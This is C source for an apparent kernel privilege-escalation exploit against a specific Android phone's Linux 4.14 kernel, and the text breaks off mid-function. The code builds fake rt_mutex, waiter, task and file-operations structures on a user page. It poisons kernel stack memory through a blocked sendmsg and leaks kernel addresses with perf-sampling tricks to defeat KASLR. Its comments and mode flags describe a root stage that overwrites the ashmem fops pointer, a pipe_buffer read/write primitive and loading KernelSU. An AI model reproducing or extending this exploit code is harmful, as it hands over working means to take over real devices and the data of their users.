/* ============================================================================
 * t37_dryrun.c — GhostLock direct-reopen Tier-2 POISON DRY-RUN (ticket 37)
 * Device: Redmi Note 9 5G (cannon), 4.14.186-perf-00243-g9a0d96109bda
 *
 * ZERO-WRITE DRY-RUN: sockaddr 48B full-field poison delivery (pi_tree mask /
 * task / lock / prio four slots, byte-level) + chain-walk behaviour evidence
 * (prio=3 canary -> chain walks to [12] but [11a] never writes off-page),
 * with EVERY write landing in victim's own kernel stack, the USER-CONTROLLED
 * marker page (memfd), or legitimate scheduler bookkeeping (locks transient,
 * rq->clock, refcount ++/-- net-zero).
 *
 * Carrier (29-r7): blocking sendmsg — AF_UNIX DGRAM, 3 formation sockets +
 * 4 fill senders, queue flooded past max_dgram_qlen (600) so victim's sendmsg
 * sleeps in unix_wait_for_peer with the 48B sockaddr copied at [W+0x18, W+0x48).
 *
 * Poison layout (35 §3.4 + 36 §8.1 mask + 37 canary deltas):
 *   iov[8]   (W-0x68..W+0x18): all {uva,0} -> tree_entry {0,0,0} (live poison)
 *   sockaddr (W+0x18..W+0x48):
 *     +0x00 pi_tree.pc   = (page_base & ~0x00FFFF00) | 1   [36 mask solve]
 *     +0x08 pi_tree.right= 0
 *     +0x10 pi_tree.left = 0
 *     +0x18 task         = init_task (slid canonical VA)
 *     +0x20 lock         = fake_lock = page_base+0x100
 *     +0x28 prio         = 3  (canary: != 120 -> chain walk enters)
 *     +0x2C pad          = 0
 *
 * Marker page = PMI-oracle'd memfd page, prefilled with the 35 §6 pseudo-world
 * (fake_lock / W0 / fake_task / fake_fops) — but in the DRY-RUN geometry:
 *   fake_lock.waiters  = {root=&W0.tree, leftmost=&W0.tree}  (35 §3.3; W0.lock
 *                        MUST equal fake_lock or rt_mutex_top_waiter's
 *                        BUG_ON(w->lock != lock) fires — 37 fix vs 35 note)
 *   W0.pi_tree         = {pc = fake_fops (RED — bit0=0; r14 KE9 fix: the old
 *                        fake_fops|1 wrote bit0=1 = BLACK per rbtree_augmented.h
 *                        RB_RED=0/RB_BLACK=1, forced ____rb_erase_color entry,
 *                        walked [fake_fops+0x10] as a tree node => code-bytes
 *                        deref = KE8/KE9), rb_right=0 (dry-run:
 *                        no TARGET), rb_left=0}
 *   W0.task            = init_task; W0.lock = fake_lock; W0.prio = 130
 *   fake_task          = full early-exit field set (35 §4.4), pi_waiters EMPTY,
 *                        pi_top_task = init_task
 *   fake_fops          = all real functions (CFI-clean) — llseek slot is the
 *                        [11a] erase collateral write landing point (in-page)
 *
 * Modes:
 *   t37_dryrun dryrun <rounds>   — full canary form (deliver + consume + drain)
 *   t37_dryrun deliver <rounds>  — degraded: deliver + readback only, NO
 *                                  consumer (fallback if canary geometry fails)
 *   t37_dryrun pagecheck         — PMI page oracle triple check (re-acquire
 *                                  page base this boot, 36 §1.5 rules)
 *
 * Discipline: zero off-page kernel writes argued step-by-step (report §2);
 * every judgment line lands in the log; device artifacts deleted after use.
 * ==========================================================================*/
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <inttypes.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>
#include <sched.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <sys/uio.h>
#include <sys/socket.h>
#include <sys/utsname.h>
#include <sys/resource.h>
#include <sys/prctl.h>
#include <dirent.h>
#include <signal.h>
#include <linux/futex.h>
#include <fcntl.h>
#include <poll.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/sysmacros.h>
#include <linux/perf_event.h>

#include "gl36_pseudo_page.h"      /* 36: all constants + sockaddr encoder */

/* ---- logging ---- */
/* 38-r35: the device /data is F2FS with fsync_mode=nobarrier+checkpoint_merge
 * — after a kernel panic (hard reset) the FS rolls back to the LAST
 * CHECKPOINT, eating every journal line that sat in page cache (r33/r34:
 * three panic rounds, zero post-mortem lines). Two fixes:
 *   1. g_adbd_fd = dup(2) taken BEFORE the stderr freopen — LOGI always
 *      writes the adb pipe too; bytes that left the device before the panic
 *      survive on the host side of the adb connection.
 *   2. the journal copy is fsynced per line (F2FS writeback, one order
 *      stronger than page cache under nobarrier). */
static int g_adbd_fd = 2;
#define LOGI(fmt, ...) do { \
	struct timespec _ts; clock_gettime(CLOCK_MONOTONIC, &_ts); \
	dprintf(g_adbd_fd, "[%ld.%03ld] " fmt "\n", (long)_ts.tv_sec, \
		_ts.tv_nsec / 1000000, ##__VA_ARGS__); \
	if (fileno(stderr) != g_adbd_fd) { \
		fprintf(stderr, "[%ld.%03ld] " fmt "\n", (long)_ts.tv_sec, \
			_ts.tv_nsec / 1000000, ##__VA_ARGS__); \
		fflush(stderr); \
		fsync(fileno(stderr)); \
	} \
	} while (0)
#define LOGE(fmt, ...) LOGI("ERR " fmt, ##__VA_ARGS__)
#define DIE_IF(cond, fmt, ...) do { if (cond) { LOGE(fmt, ##__VA_ARGS__); exit(2); } } while (0)

static const char *errno_name(int e)
{
	switch (e) {
	case 0: return "OK";
	case EAGAIN: return "EAGAIN";
	case EDEADLK: return "EDEADLK";
	case EINVAL: return "EINVAL";
	case EPERM: return "EPERM";
	case ESRCH: return "ESRCH";
	case ETIMEDOUT: return "ETIMEDOUT";
	case EFAULT: return "EFAULT";
	case ENOMEM: return "ENOMEM";
	case ENOSYS: return "ENOSYS";
	case EBADF: return "EBADF";
	default: return "?";
	}
}

static const char *u64hex(__u64 v)
{
	/* 38-r36: 4 -> 16 rotating slots. 4 slots made any LOGI with >4
	 * u64hex args print GARBAGE for the leading args (the 5th call
	 * overwrote the 1st slot — r16 cosmetic note), which misread every
	 * rearm/anchors line during the 38 panic triage. */
	static char buf[16][32];
	static int idx;
	char *p = buf[idx & 15];
	idx++;
	snprintf(p, 32, "0x%llx", (unsigned long long)v);
	return p;
}

/* ---- syscall numbers (arm64 asm-generic main table; x86_64 for host smoke) ---- */
#ifdef __aarch64__
#define T37_SYS_SENDMSG   211
#define T37_SYS_MEMFD_CREATE 279
#else
#define T37_SYS_SENDMSG   SYS_sendmsg
#define T37_SYS_MEMFD_CREATE 319   /* x86_64 memfd_create (host smoke only) */
#endif

/* ---- constants inherited from 29-r7 carrier ---- */
#define SM_NAMELEN     0x30     /* sockaddr copy 48B -> [W+0x18, W+0x48) */
#define SM_IOV_FILL_UVA 0x5000  /* iov[0..7].base placeholder (len=0, dead zone
                                 * below W; 29 r5: NULL base would EFAULT) */
#define SM2_PAYLOAD     64      /* data segment size (ret verdict value) */
#define SM2_FILL_MAX    768     /* device max_dgram_qlen=600 -> need >600 queued */
#define T37_POISON_PRIO 3       /* canary prio: != 120 -> chain walk enters */

/* ---- formation globals (29-r7 shape) ---- */
static uint32_t f_wait, f_pi_target, f_pi_chain;
static volatile uint32_t a_ready, a_waiting, b_started, deadlock_seen;
static volatile uint32_t stamp_ready;   /* poison landed, victim zero-syscall */
static volatile uint32_t stamp_sent;    /* poison constructed, entering sendmsg */
static volatile uint32_t consumed;
static volatile int victim_tid;
static int g_round_no;
static volatile long g_sm_ret;
static volatile int g_sm_errno;
static volatile int g_sm2_slept;

static int g_sk_snd = -1, g_sk_rcv = -1, g_sk_fill = -1;
static int g_sk_fill2 = -1, g_sk_fill3 = -1, g_sk_fill4 = -1;
static unsigned char g_sa_tmpl[SM_NAMELEN] __attribute__((aligned(8)));
static unsigned char g_sm2_payload[SM2_PAYLOAD];
static volatile uintptr_t g_last_iov_addr, g_last_sa_addr;

/* ---- t37 mode flags ---- */
static int g_mode_deliver_only;   /* deliver+readback, no consumer (fallback) */
static uint64_t g_prw_memstart = 0x40000000ULL; /* 38-r64: measured via pagemap */
static int g_mode_root;           /* 37-r17: Tier-3 write round (W0.pi.rb_right=TARGET) */
static int g_mode_ksu;            /* 38-r29: load kernelsu.ko after root */
static int g_mode_physrw;         /* 38-r59: forged pipe_buffer rw ladder */
static pthread_t g_consumer_th;   /* 37-r20: join before drain */
static int g_consumer_tid;        /* 37-r27: walk-by-comm target */
static int g_victim_prio = -1;     /* pre-consume readback of victim real prio */

/* ---- runtime anchors (single source of truth) ---- */
static uint64_t g_slide;          /* text slide, re-pinned per boot */
static uint64_t g_slide_forced;   /* host-supplied (offline match), 37-r5 */
static uint64_t g_page_base;      /* marker page linear VA (PMI oracle) */
static uint64_t g_fake_lock, g_w0, g_fake_task, g_fake_fops;

/* ---- futex wrappers (29 formation identical) ---- */
static long futex_op(uint32_t *uaddr, int op, uint64_t val, void *ts,
		     uint32_t *uaddr2, uint32_t val3)
{
	return syscall(SYS_futex, uaddr, op, val, ts, uaddr2, val3);
}
static void futex_pi_lock(uint32_t *uaddr)
{
	long r = futex_op(uaddr, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
	if (r != 0)
		LOGI("futex LOCK_PI(0x%x) ret=%ld errno=%d(%s)", *uaddr, r, errno, errno_name(errno));
}
static void futex_wait_int(volatile uint32_t *uaddr, uint32_t val)
{
	while (*uaddr == val)
		futex_op((uint32_t *)uaddr, FUTEX_WAIT, val, NULL, NULL, 0);
}
static void futex_wake_int(volatile uint32_t *uaddr)
{
	futex_op((uint32_t *)uaddr, FUTEX_WAKE, 1, NULL, NULL, 0);
}

/* ---- CPU pinning (29-r7: victim->cpu6, consumer->cpu0, owner->cpu1) ---- */
static void t37_pin_cpu(int cpu)
{
	cpu_set_t set;
	CPU_ZERO(&set);
	CPU_SET(cpu, &set);
	if (sched_setaffinity(0, sizeof(set), &set) != 0)
		LOGI("[t37] pin_cpu(%d) FAIL errno=%d — continuing unpinned (non-destructive)",
		     cpu, errno);
}

/* ============================================================================
 * Marker page pseudo-world (35 §3.3 layout, 37 dry-run deltas)
 * ============================================================================
 * Page is a USER-CONTROLLED memfd page (mmap'd, mlocked): every "kernel write"
 * the chain walk performs inside this page is a write to user-controlled
 * memory — the dry-run's page-local writes are therefore legitimate.
 *
 * Layout:
 *   +0x100 fake_lock  wait_lock=0; waiters.root=waiters.leftmost=&W0.tree;
 *                    owner=fake_task|1
 *   +0x200 W0         tree={pc=1(black root),0,0}  — linked as lock's only node
 *                    pi_tree={pc=fake_fops(RED bit0=0, r14 KE9 fix),
 *                    rb_right=0, rb_left=0}
 *                    task=init_task; lock=fake_lock (37 fix: BUG_ON guard);
 *                    prio=130; deadline=0
 *   +0x400 fake_task  early-exit field set: [0]=0 ti.flags, [0x5C]=0 cpu,
 *                    [0x7C]=0 on_rq, usage=0x100, prio=120, normal_prio=120,
 *                    pi_lock=0, pi_waiters={0,0} EMPTY, pi_top_task=init_task,
 *                    pi_blocked_on=0, turbo=0, inherit=0
 *                    (37 fix: 36/35 put fake_task@0x800 but 0x800+0xAA0 =
 *                    0x12A0 > 4K — page OVERFLOW, first exposed by actually
 *                    writing the page; moved to 0x400, field span ends 0xEA0)
 *   +0xE00 fake_fops  all real functions (36 §5, CFI-clean) — moved from
 *                    0xB00 (task field span now ends 0xEA0; fops 0xF8 at
 *                    0xE00 ends 0xEF8 < 0x1000; llseek slot = [11a] erase
 *                    collateral write landing point, in-page)
 */
static void t37_fill_pseudo_page(uint8_t *page)
{
	uint64_t init_task = GL36_INIT_TASK_STATIC + g_slide;
	uint64_t fake_lock = g_page_base + GL36_FAKE_LOCK_OFF;
	uint64_t w0        = g_page_base + GL36_W0_OFF;
	uint64_t fake_task = g_page_base + GL36_FAKE_TASK_OFF;
	uint64_t fake_fops = g_page_base + GL36_FAKE_FOPS_OFF;

	memset(page, 0, 4096);

	/* fake_lock (rt_mutex @ +0x100) */
	*(uint64_t *)(page + GL36_FAKE_LOCK_OFF + 0x00) = 0;              /* wait_lock */
	*(uint64_t *)(page + GL36_FAKE_LOCK_OFF + 0x08) = w0 + GL36_WAITER_TREE_PC_OFF; /* waiters.root = &W0.tree */
	*(uint64_t *)(page + GL36_FAKE_LOCK_OFF + 0x10) = w0 + GL36_WAITER_TREE_PC_OFF; /* waiters.leftmost */
	*(uint64_t *)(page + GL36_FAKE_LOCK_OFF + 0x18) = fake_task | 1;  /* owner | HAS_WAITERS */

	/* W0 (fake waiter @ +0x200) — tree_entry linked in fake_lock.waiters */
	*(uint64_t *)(page + GL36_W0_OFF + GL36_WAITER_TREE_PC_OFF)    = 1;         /* black root */
	*(uint64_t *)(page + GL36_W0_OFF + GL36_WAITER_TREE_RIGHT_OFF) = 0;
	*(uint64_t *)(page + GL36_W0_OFF + GL36_WAITER_TREE_LEFT_OFF)  = 0;
	/* pi_tree: 37 canary — RED parent color, rb_right=0 (dry-run: no TARGET).
	 * RED means bit0=0 (MiCode rbtree_augmented.h:110-116: RB_RED=0,
	 * RB_BLACK=1, __rb_is_black(pc)=pc&1). r14 KE9 fix: the previous
	 * `fake_fops | 1` wrote bit0=1 = BLACK => rebalance=parent=fake_fops =>
	 * ____rb_erase_color entered, walked [fake_fops+0x10] as a tree node
	 * (configfs runtime ptr, rb_is_red) => case-1 rotate deref'd code bytes
	 * => FAR=0x3fda9044ff4 (x11=0x910003fda9044ff4, two a64 insns).
	 * bit0=0 => __rb_is_black=false => rebalance=NULL => erase_color never
	 * runs; with rb_right=0 the child write never happens => ZERO off-page
	 * write. */
	*(uint64_t *)(page + GL36_W0_OFF + GL36_WAITER_PI_PC_OFF)    = fake_fops; /* RED: bit0=0 */
	/* 37-r17: root mode arms the [11a] off-page write — rb_right = TARGET
	 * (ashmem miscdevice->fops slot, canonical 0xffffff800a6bd460 + slide).
	 * rb_erase child path then writes [TARGET] = fake_fops (the hijack
	 * itself, 35 §4.1 [11a]). Dry-run keeps rb_right=0 (write never fires). */
	*(uint64_t *)(page + GL36_W0_OFF + GL36_WAITER_PI_RIGHT_OFF) =
		g_mode_root ? (g_slide + GL36_ASHMEM_MISC_STATIC + 0x10) : 0;
	*(uint64_t *)(page + GL36_W0_OFF + GL36_WAITER_PI_LEFT_OFF)  = 0;
	*(uint64_t *)(page + GL36_W0_OFF + GL36_WAITER_TASK_OFF)     = init_task;
	*(uint64_t *)(page + GL36_W0_OFF + GL36_WAITER_LOCK_OFF)     = fake_lock;  /* 37 fix */
	*(uint32_t *)(page + GL36_W0_OFF + GL36_WAITER_PRIO_OFF)     = 130;
	*(uint64_t *)(page + GL36_W0_OFF + GL36_WAITER_DEADLINE_OFF) = 0;

	/* fake_task (@ +0x400, 37 overflow fix) — 35 §4.4 early-exit field set */
	*(uint64_t *)(page + GL36_FAKE_TASK_OFF + 0x00) = 0;                 /* ti.flags */
	*(uint32_t *)(page + GL36_FAKE_TASK_OFF + GL36_TASK_CPU_OFF) = 0;    /* cpu=0 */
	*(uint32_t *)(page + GL36_FAKE_TASK_OFF + GL36_TASK_ON_RQ_OFF) = 0;  /* on_rq */
	*(uint64_t *)(page + GL36_FAKE_TASK_OFF + GL36_TASK_USAGE_OFF) = 0x100;
	*(uint32_t *)(page + GL36_FAKE_TASK_OFF + GL36_TASK_PRIO_OFF) = 120;
	*(uint32_t *)(page + GL36_FAKE_TASK_OFF + GL36_TASK_NORMAL_PRIO_OFF) = 120;
	*(uint64_t *)(page + GL36_FAKE_TASK_OFF + GL36_TASK_PI_LOCK_OFF) = 0;
	*(uint64_t *)(page + GL36_FAKE_TASK_OFF + GL36_TASK_PI_WAITERS_OFF + 0) = 0;      /* root */
	*(uint64_t *)(page + GL36_FAKE_TASK_OFF + GL36_TASK_PI_WAITERS_OFF + 8) = 0;      /* leftmost */
	*(uint64_t *)(page + GL36_FAKE_TASK_OFF + GL36_TASK_PI_TOP_TASK_OFF) = init_task;
	*(uint64_t *)(page + GL36_FAKE_TASK_OFF + GL36_TASK_PI_BLOCKED_ON_OFF) = 0;
	*(uint32_t *)(page + GL36_FAKE_TASK_OFF + GL36_TASK_TURBO_OFF) = 0;
	*(uint32_t *)(page + GL36_FAKE_TASK_OFF + GL36_TASK_INHERIT_TYPES_OFF) = 0;

	/* fake_fops (@ +0xE00, 37 overflow fix) — real functions, slide-adjusted */
	{
		struct gl36_fops f;
		gl36_fill_fops(&f);
		memcpy(page + GL36_FAKE_FOPS_OFF, &f, sizeof(f));
	}

	g_fake_lock = fake_lock;
	g_w0 = w0;
	g_fake_task = fake_task;
	g_fake_fops = fake_fops;
}

/* ============================================================================
 * PMI page oracle (36 §1.5 triple-check rules) — re-acquire marker page VA
 * this boot. Pure read: per-thread cpu-cycles PMI, REGS_INTR full mask.
 * Decisive check (c): virt_to_page(P) appears in vmemmap-domain register
 * values. Corroborate (a) many in-page offsets, (b) exact page-base value.
 * ============================================================================
 */
#define REGS_MASK   0x1FFFFFFFFULL
#define NREGS       33
#define RING_PAGES  1024
#define HB_CAP      300017

struct kv { uint64_t key; uint64_t cnt; uint32_t ridx; };
static struct kv pb_h[HB_CAP], vm_h[HB_CAP];

static int t37_pmi_open(int *fd_out, uint8_t **ring_out, uint64_t *ring_len_out)
{
	struct perf_event_attr a;
	int fd;
	uint64_t len;

	memset(&a, 0, sizeof(a));
	a.size = sizeof(a);
	a.type = PERF_TYPE_HARDWARE;
	a.config = PERF_COUNT_HW_CPU_CYCLES;
	a.sample_period = 4096;      /* 36 sweet spot */
	a.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_TID | PERF_SAMPLE_TIME |
			PERF_SAMPLE_PERIOD | PERF_SAMPLE_REGS_INTR;
	a.sample_regs_intr = REGS_MASK;
	a.exclude_user = 1;
	a.disabled = 1;
	fd = syscall(__NR_perf_event_open, &a, 0, -1, -1, 0);
	if (fd < 0)
		return -1;
	len = (RING_PAGES + 1) * 4096;
	*ring_out = mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	if (*ring_out == MAP_FAILED) {
		close(fd);
		return -1;
	}
	*ring_len_out = len;
	ioctl(fd, PERF_EVENT_IOC_RESET, 0);
	ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
	*fd_out = fd;
	return 0;
}

/* scan the ring: fill physmap-page-base and vmemmap-value histograms */
static uint64_t t37_pmi_scan(uint8_t *ring, uint64_t ring_pages,
			     uint64_t *samples_out)
{
	volatile struct perf_event_mmap_page *up =
		(volatile struct perf_event_mmap_page *)ring;
	uint64_t head, cap, off, samples = 0;

	memset(pb_h, 0, sizeof(pb_h));
	memset(vm_h, 0, sizeof(vm_h));
	__sync_synchronize();
	head = up->data_head;
	cap = ring_pages * 4096;
	if (head > cap)
		head = cap;
	off = 0;
	while (off + 8 <= head) {
		struct perf_event_header *h =
			(struct perf_event_header *)(ring + 4096 + off);
		if (h->size < 8 || off + h->size > head)
			break;
		if (h->type == PERF_RECORD_SAMPLE) {
			uint8_t *p = (uint8_t *)h + 8;
			uint64_t abi;
			p += 8;  /* IP */
			p += 8;  /* TID */
			p += 8;  /* TIME */
			p += 8;  /* PERIOD */
			abi = *(uint64_t *)p; p += 8;
			if (abi >= 1) {
				for (int idx = 0; idx < NREGS; idx++) {
					uint64_t v;
					if (!((REGS_MASK >> idx) & 1))
						continue;
					memcpy(&v, p, 8); p += 8;
					/* physmap candidates; exclude the ACTUAL vmemmap span
				 * ([VMEMMAP_START, VMEMMAP_START + 128MB) on 8GB DRAM)
				 * — 37-r10: r5 picked a 0xffffffff1.. candidate that is
				 * really a high-physmap value, not vmemmap; the true
				 * vmemmap struct-page pointers live in a narrow band. */
				if (v >= GL36_PHYSMAP_LO && v < GL36_PHYSMAP_HI &&
				    !(v >= GL36_VMEMMAP_START && v < GL36_VMEMMAP_START + 0x8000000ULL)) {
						uint64_t pb = v & ~0xFFFULL, i = (pb >> 7) % HB_CAP;
						while (pb_h[i].cnt && pb_h[i].key != pb)
							i = (i + 1) % HB_CAP;
						if (!pb_h[i].cnt) { pb_h[i].key = pb; pb_h[i].ridx = idx; }
						pb_h[i].cnt++;
					}
					if (v >= GL36_VMEMMAP_START && v < GL36_PAGE_OFFSET) {
						uint64_t i = (v >> 7) % HB_CAP;
						while (vm_h[i].cnt && vm_h[i].key != v)
							i = (i + 1) % HB_CAP;
						if (!vm_h[i].cnt) { vm_h[i].key = v; vm_h[i].ridx = idx; }
						vm_h[i].cnt++;
					}
				}
				samples++;
			}
		}
		off += h->size;
	}
	*samples_out = samples;
	return head;
}

/* count occurrences of exact value in vmemmap histogram */
static uint64_t t37_vm_count(uint64_t val)
{
	uint64_t i = (val >> 7) % HB_CAP;
	while (vm_h[i].cnt && vm_h[i].key != val)
		i = (i + 1) % HB_CAP;
	return vm_h[i].cnt;
}

/* 36 §1.5 triple check on candidate page base; returns 0..3 (checks passed) */
static int t37_triple_check(uint64_t pb)
{
	uint64_t pptr = gl36_virt_to_page(pb);
	int checks = 0;
	/* (b) exact page-base value present in physmap histogram */
	uint64_t i = (pb >> 7) % HB_CAP;
	while (pb_h[i].cnt && pb_h[i].key != pb)
		i = (i + 1) % HB_CAP;
	if (pb_h[i].cnt > 20)
		checks += 1;
	/* (c) DECISIVE: struct page* in vmemmap-domain registers */
	if (t37_vm_count(pptr) > 20)
		checks += 2;
	return checks;
}

/* ============================================================================
 * Marker-page setup: memfd + 4K pseudo-world payload, mmap'd + mlocked.
 * Returns fd; fills map pointer. The page stays resident (mlock) so its
 * linear VA stays the same through the round.
 * ============================================================================
 */
static uint8_t t37_page[4096] __attribute__((aligned(4096)));
static uint8_t *g_page_map;
static int g_page_fd = -1;

static int t37_marker_page_setup(void)
{
	uint8_t *m;

	g_page_fd = syscall(T37_SYS_MEMFD_CREATE, "t37dryrun", 0);
	if (g_page_fd < 0) {
		LOGI("[t37] memfd_create FAIL errno=%d(%s)", errno, errno_name(errno));
		return -1;
	}
	if (ftruncate(g_page_fd, 4096)) {
		LOGI("[t37] ftruncate FAIL");
		close(g_page_fd); g_page_fd = -1;
		return -1;
	}
	/* marker-only payload now; pseudo-world is filled AFTER slide/page pin
	 * (fix for the 09:33 KE: filling before pin baked g_page_base=0 into
	 * fake_lock/W0/g_fake_* anchors -> W.lock poisoned as 0x100 -> [5]
	 * trylock(0x100) NULL-deref. 37-r3 fix.) */
	memset(t37_page, 0, 4096);
	((uint32_t *)t37_page)[0] = 0x54413733u;   /* "37ST" marker */
	((uint32_t *)t37_page)[1] = 0x54413733u;
	if (pwrite(g_page_fd, t37_page, 4096, 0) != 4096) {
		LOGI("[t37] pwrite FAIL errno=%d", errno);
		close(g_page_fd); g_page_fd = -1;
		return -1;
	}
	m = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, g_page_fd, 0);
	if (m == MAP_FAILED) {
		LOGI("[t37] mmap memfd FAIL errno=%d", errno);
		close(g_page_fd); g_page_fd = -1;
		return -1;
	}
	if (mlock(m, 4096))
		LOGI("[t37] mlock FAIL (continuing unpinned): %s", strerror(errno));
	if (memcmp(m, t37_page, 4096) == 0)
		LOGI("[t37] marker page payload verified via mmap (resident, pinned)");
	else
		LOGI("[t37] marker page MISMATCH via mmap!");
	g_page_map = m;
	return 0;
}

/* ============================================================================
 * Slide re-pin (39-r108 median-distance method, port of pin_slide_median.py;
 * history: 37's weighted+membership composite gate below mis-pinned by 8
 * slots (16MB) on the r4 boot and was superseded by the host-side
 * median vote — true slide median=0x68, wrong candidates 3 orders higher,
 * validated on the r10 boot):
 * per-thread PMI over own pread loop -> kernel IP histogram ->
 *   top-512 IPs by frequency -> for each 2MB-aligned candidate s in the
 *   full band, median over IPs of min distance from (ip - s) to the
 *   nearest starts[] entry (binary-search neighbours) -> argmin.
 * A 1MB sanity gate on the winning median rejects degenerate histograms;
 * two independent sample+vote rounds must agree (t37_pin_slide wrapper).
 * The tiny table (t37_tiny) is still decoded for the log but no longer
 * votes.
 * ============================================================================
 */
#include "t37_slide_table.h"

#define T37_SYM_MAX 96000
static uint64_t t37_sym_buf_a[T37_SYM_MAX];
static uint64_t t37_sym_buf_b[T37_SYM_MAX];

static int t37_sym_decode(const unsigned char *blob, uint64_t *out, int cap)
{
	uint32_t n, first;
	uint64_t addr;
	int i;
	size_t pos = 8;

	memcpy(&n, blob, 4);
	memcpy(&first, blob + 4, 4);
	if ((int)n > cap)
		return -1;
	addr = T37_SYM_BASE + first;
	out[0] = addr;
	for (i = 1; i < (int)n; i++) {
		uint16_t d16;

		memcpy(&d16, blob + pos, 2);
		pos += 2;
		if (d16 == 0xFFFF) {
			uint32_t d32;

			memcpy(&d32, blob + pos, 4);
			pos += 4;
			addr += d32;
		} else {
			addr += d16;
		}
		out[i] = addr;
	}
	return (int)n;
}

/* index of first element > v */
static int t37_bsearch(const uint64_t *a, int n, uint64_t v)
{
	int lo = 0, hi = n;

	while (lo < hi) {
		int mid = (lo + hi) / 2;

		if (a[mid] <= v)
			lo = mid + 1;
		else
			hi = mid;
	}
	return lo;
}

/* (39-r108: t37_in_sym removed with the membership gate it served; the
 * starts table t37_sym_buf_b now feeds the median-distance vote directly.) */

/* ---- 39-r108 median-distance vote helpers (port of pin_slide_median.py) ---- */
static int kv_freq_cmp(const void *pa, const void *pb)
{
	const struct kv *a = pa, *b = pb;

	/* count desc; key asc tie-break (deterministic vs Counter.most_common) */
	if (a->cnt != b->cnt)
		return a->cnt > b->cnt ? -1 : 1;
	if (a->key != b->key)
		return a->key < b->key ? -1 : 1;
	return 0;
}

static int u64_cmp(const void *pa, const void *pb)
{
	uint64_t a = *(const uint64_t *)pa, b = *(const uint64_t *)pb;

	return a < b ? -1 : (a > b ? 1 : 0);
}

/* median-distance vote core (39-r108; port of pin_slide_median.py, also
 * drives the offline `voteonly` mode). The old weighted+membership composite
 * gate mis-pinned by 8 slots (16MB) on the r4 boot (37-r5) — the host
 * -validated median method: true slide median=0x68, wrong candidates 3
 * orders higher (37-r10). top-512 by frequency votes singletons out (py
 * r11 lesson: full-distinct scan dilutes the median). -1 on failure. */
static int t37_median_vote(struct kv *ip_h, int n_starts, uint64_t *out)
{
	static struct kv flat[65537];
	int n_flat = 0, n_top;
	uint64_t best_s = 0, best_md = ~0ULL;
	uint64_t *ds;

	for (int i = 0; i < 65537 && n_flat < 65537; i++) {
		if (!ip_h[i].cnt)
			continue;
		flat[n_flat].key = ip_h[i].key;
		flat[n_flat].cnt = ip_h[i].cnt;
		n_flat++;
	}
	if (!n_flat) {
		LOGI("[t37] slide vote: no kernel IPs (FAIL)");
		return -1;
	}
	qsort(flat, n_flat, sizeof(struct kv), kv_freq_cmp);
	n_top = n_flat < 512 ? n_flat : 512;
	ds = malloc(sizeof(uint64_t) * n_top);
	if (!ds) {
		LOGI("[t37] slide vote: OOM");
		return -1;
	}
	for (uint64_t slot = 0; slot < 0x20000; slot++) {
		uint64_t s = slot << 21;

		for (int i = 0; i < n_top; i++) {
			uint64_t a = flat[i].key - s;
			int j = t37_bsearch(t37_sym_buf_b, n_starts, a);
			uint64_t bd = ~0ULL, d;

			if (j < n_starts) {
				d = a > t37_sym_buf_b[j] ?
				    a - t37_sym_buf_b[j] :
				    t37_sym_buf_b[j] - a;
				if (d < bd)
					bd = d;
			}
			if (j > 0) {
				d = a > t37_sym_buf_b[j - 1] ?
				    a - t37_sym_buf_b[j - 1] :
				    t37_sym_buf_b[j - 1] - a;
				if (d < bd)
					bd = d;
			}
			ds[i] = bd;
		}
		qsort(ds, n_top, sizeof(uint64_t), u64_cmp);
		if (ds[n_top / 2] < best_md) {
			best_md = ds[n_top / 2];
			best_s = s;
		}
	}
	free(ds);
	LOGI("[t37] slide median vote: BEST %s median=%s (top=%d distinct=%d)",
	     u64hex(best_s), u64hex(best_md), n_top, n_flat);
	/* sanity gate: a wrong slide lands orders of magnitude higher than
	 * the true one (r10: 0x68 vs 0x1b8de4); 1MB is generous */
	if (best_md > 0x100000ULL) {
		LOGI("[t37] slide vote FAILED: median=%s > sanity gate 0x100000",
		     u64hex(best_md));
		return -1;
	}
	*out = best_s;
	return 0;
}

static int t37_slide_vote_once(uint64_t *out)
{
	int fd, n_tiny, n_starts, n_ips = 0;
	uint8_t *ring;
	uint64_t ring_len;
	static struct kv ip_h[65537];
	volatile struct perf_event_mmap_page *up;
	uint64_t head, cap, off;
	uint8_t buf[512];

	n_tiny = t37_sym_decode(t37_tiny, t37_sym_buf_a, T37_SYM_MAX);
	n_starts = t37_sym_decode(t37_starts, t37_sym_buf_b, T37_SYM_MAX);
	if (n_tiny <= 0 || n_starts <= 0) {
		LOGI("[t37] slide table decode FAIL");
		return -1;
	}
	LOGI("[t37] slide tables: tiny=%d starts=%d (span %s..%s)",
	     n_tiny, n_starts, u64hex(t37_sym_buf_a[0]), u64hex(t37_sym_buf_a[n_tiny - 1]));

	{
		struct perf_event_attr a;

		memset(&a, 0, sizeof(a));
		a.size = sizeof(a);
		a.type = PERF_TYPE_HARDWARE;
		a.config = PERF_COUNT_HW_CPU_CYCLES;
		a.sample_period = 4096;
		a.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_TID | PERF_SAMPLE_TIME |
				PERF_SAMPLE_PERIOD | PERF_SAMPLE_REGS_INTR;
		a.sample_regs_intr = REGS_MASK;
		a.exclude_user = 1;
		a.disabled = 1;
		fd = syscall(__NR_perf_event_open, &a, 0, -1, -1, 0);
		if (fd < 0) {
			LOGI("[t37] slide perf_event_open FAIL errno=%d", errno);
			return -1;
		}
		ring_len = (RING_PAGES + 1) * 4096;
		ring = mmap(NULL, ring_len, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
		if (ring == MAP_FAILED) {
			close(fd);
			return -1;
		}
		ioctl(fd, PERF_EVENT_IOC_RESET, 0);
		ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
	}
	for (int i = 0; i < 160000; i++)
		if (pread(g_page_fd, buf, sizeof(buf), 0) < 0)
			break;
	ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

	memset(ip_h, 0, sizeof(ip_h));
	up = (volatile struct perf_event_mmap_page *)ring;
	__sync_synchronize();
	head = up->data_head;
	cap = RING_PAGES * 4096;
	if (head > cap)
		head = cap;
	off = 0;
